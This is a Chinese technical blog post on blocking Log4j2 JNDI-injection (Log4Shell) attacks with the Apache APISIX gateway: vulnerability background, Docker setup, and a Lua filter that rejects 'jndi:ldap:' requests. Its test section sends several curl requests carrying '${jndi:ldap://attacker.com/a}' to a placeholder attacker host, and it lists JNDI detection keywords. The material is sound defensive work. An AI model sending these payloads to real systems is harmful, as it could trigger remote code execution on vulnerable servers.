# 0x01 漏洞背景

近期Log4j引起的安全问题， 很受到业界关注。Log4j作为Java生态中广泛使用的日志组件，被很多的Java软件系统使用依赖。例如：Apache
Struts2、大数据分析系统Flink、ElasticSearch数据库等等， 这个列表，随着时间的迁移，与Log4j2相关的软件使列表项目还会增加。

当前业界给出的应急方案中，通过修改JVM参数和设置环境变量化的方式，可作为应急的临时方案解决燃眉之急，但后续依然需要持续的定位资产，并判断危害影响范围。

业界的方案，如下：

    
    
    Log4j 漏洞情况
    漏洞危害：高危、远程代码执行 
    影响版本：Log4j2.x<=2.14.1
    不受影响版本：Apache log4j-2.15.0-rc1
    Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。
    影响范围 
    可能的受影响应用包括但不限于如下：
    Spring-Boot-strater-log4j2，Apache Struts2，Apache Solr，Apache Flink，Apache Druid，ElasticSearch，flume，dubbo，Redis，logstash，kafka。
    更多组件可参考如下链接：
    https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1
    受影响的产品：正在核查当中。
    应对措施：
    1、waf等可阻断安全设备中添加拦截规则，关键字为“jndi:ldap://”、“jndi:rmi”；
    2、流量监测设备监控是否有相关 Dnslog 域名的请求以及数据包中有“jndi:ldap://”、“jndi:rmi”特征的数据包，定位受害资产，进行应急处置。
    3、在log4j2.ini配置中可以设置log4j2formatMsgNoLookups=True，禁止解析JDNI
    4、系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS设置为true
    5、Jvm运行参数-Dlog4j2.formatMsgNoLookups=true
    6、补丁链接:
    https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1
    检测方案
    1、由于攻击者在攻击过程中可能使用 dnslog 进行漏洞探测，因此可以通过流量监测设备监控是否有相关 Dnslog 域名的请求，来检测受攻击行为；
    2. 可以通过监测相关流量或者日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行
    为。
    3、排查gitlab pom代码jar包和器镜像jar包
    4、使用HIDS 进行进程和路径jar包检查
    5、使用awvs+jndi payload进行批量化检测
    

流量检测系统：创建规则完成威胁检查，可以基于Http协议层面的数据检索，通过漏洞的特征，创建检查规则，并进行漏洞预警。

HIDS系统：基于HIDS系统拉取资产信息，定位到Log4j的影响资产范围。

WAF系统：基于WAF系统对威胁特征字符串，创建拦截策略进行发现拦截，接下来，我们将针于类ＷＡＦ的方式，给出基于一种，基于开源软件平台的应急解决方案。

# 0x02 Apache APISIX开源网关

Apache APISIX作为一个动态、实时的高性能网关系统同时，也提供了一种发现Log4j问题，并快速进行拦截的机制，
基于这个机制，提供了一种应急方案的可能。

Apacahe APISIX在这次安全应急场景中，有几个特点： 网关部署快、创建策略快，修整拦截策略快。

# 0x03 Apache APISIX的安装：

使用Docker快速安装APISIX。

## 安装Apache APISIX

APISIX需要依赖其他软件，为了快速部署使用All in one的部署方案。

    
    
    docker run -d \
    -p 9080:9080 -p 9091:9091 -p 2379:2379 \
    -v `pwd`/all-in-one/apisix/config.yaml:/usr/local/apisix/conf/config.yaml \
    apache/apisix:whole
    

## 安装Apache APISIX Dashboard。

    
    
    docker run -d \
    -p 19080:9080 -p 19091:9091 -p 12379:2379 -p 19000:9000 \
    -v `pwd`/all-in-one/apisix/config.yaml:/usr/local/apisix/conf/config.yaml \
    -v `pwd`/all-in-one/apisix-dashboard/conf.yaml:/usr/local/apisix-dashboard/conf/conf.yaml \
    apache/apisix-dashboard:whole
    

以上Docker安装方式，供参考，可以根据实际的测试与生产环境情况进行调整 。

# 0x04 拦截特征

Log4j漏洞在应急的过程中，针对应急方案，白帽子也创造了新的绕过的方案，针对绕过需要动态的更新拦截策略。使用Apache
APISIX应急，相当于快速在自己的环境中，创建了一个类WAF防火墙系统，这个系统区别于传统的WAF防火墙，但确实现了WAF系统核心的威胁发现拦截功能，基于关键字:“jndi:ldap://”、"jndi:rmi",
作为定位特征，进行定位与拦截。

如果后续，产生了新的绕过方案，大家可以用Apache APISIX，提供的这种动态创建策略的机制，快速进行策略的调整 ，就是调整函数。

Log4j作为一个历史悠久的日志服务组件的，与其依赖的软件系统群多，在没有彻底升级解决所有相关资产之前，Apache
APISIX让大家多了一种快速应急的选择。

# 0x05 应急策略创建

Apache APISIX是要针对关键字进行定位拦击，关键字是：jndi:ldap:。  
而实现这个拦截动作功能，是由APISIX的[serverless](https://apisix.apache.org/zh/docs/apisix/plugins/serverless/)插件完成。

所谓快速动态的应急特点，在于创建拦截应急策略， 只需要基于插件快速注册执行一个可执行脚本函数即可，完成了这个函的定义实现，也就完成了拦截策略的实现，如下：

    
    
    $ curl http://127.0.0.1:9080/apisix/admin/routes/1 -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1' -X PUT -d '
    
    {
    
     "uri": "/*",
    
     "plugins":{
    
     "serverless-pre-function":{
    
     "phase":"rewrite",
    
     "functions":[
    
     "return function(conf, ctx) local core = require(\"apisix.core\"); local payload, err = core.request.get_body(); if not payload then local uri_args, err = core.request.get_uri_args(ctx)\n if uri_args then payload = core.json.encode(uri_args, true) end; end; local m = ngx.re.match(payload, \"jndi:ldap:\", \"jo\"); if m then ngx.exit(401) end; end"
    
     ]
    
     }
    
     },
    
     "upstream": {
    
     "type": "roundrobin",
    
     "nodes": {
    
     "127.0.0.1:1980": 1
    
     }
    
     }
    
    }'
    

整体策略实现的核心就是这个Lua函数有，函数的处理过程，分三步：

  1. 提取请求负载（包括 GET 请求的 URL 传参方式和 POST/PUT 请求体传参方式）

  2. 正则匹配恶意负载

  3. 拦截携带恶意负载的请求

# 0x06 应急策略验证

## GET方法拦截

拦截在 GET 请求参数中携带恶意负载

    
    
    $ curl -I 'http://127.0.0.1:9080/hello?foo=${jndi:ldap://attacker.com/a}'
    
    HTTP/1.1 401 Unauthorized
    
    ……
    

## POST方法请求拦截

    
    
    拦截在 POST 请求体(application/json)中携带恶意负载
    
    $ curl -i 'http://127.0.0.1:9080/hello' -H 'Content-Type: application/json' -X POST -d '
    
    {
    
     "foo": "${jndi:ldap://attacker.com/a}"
    
    }'
    
    HTTP/1.1 401 Unauthorized
    
    ……
    

## Body text/plain请求拦截

拦截在 POST 请求体(text/plain)中携带恶意负载

    
    
    curl -i 'http://127.0.0.1:9080/hello' -H 'Content-Type: text/plain' -X POST -d '
    
    ${jndi:ldap://attacker.com/a}'
    
    HTTP/1.1 401 Unauthorized
    
    ……
    

## Body application/x-www-form-urlencoded请求拦截

拦截在 POST 请求体(application/x-www-form-urlencoded，不对请求体进行 URL 编码)中携带恶意负载

    
    
    curl -i 'http://127.0.0.1:9080/hello' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d '
    
    foo=${jndi:ldap://attacker.com/a}'
    
    HTTP/1.1 401 Unauthorized
    
    ……
    

# 0x07 总结

Log4j漏洞的特殊性，造成应急涉及的资产多，确认范围大、应急时间紧，需要一个快速的应急方案，去缓解这种局面，在资产未全部妥善升级之前，在新的绕过方法产生变化过程中，可快速的调整防护策略。开源社区中Apahce
APISIX软件平台，基于快速部署、及灵活动态性功能特点， 为当前Log4j2这种应急场景，提供了一种新的解决方向，虽然本身Apache
APISIX网关平台，不是单纯的WAF系统，但确可以担当WAF防火墙的漏洞拦截的功能角色。

# 参考

https://github.com/apache/apisix

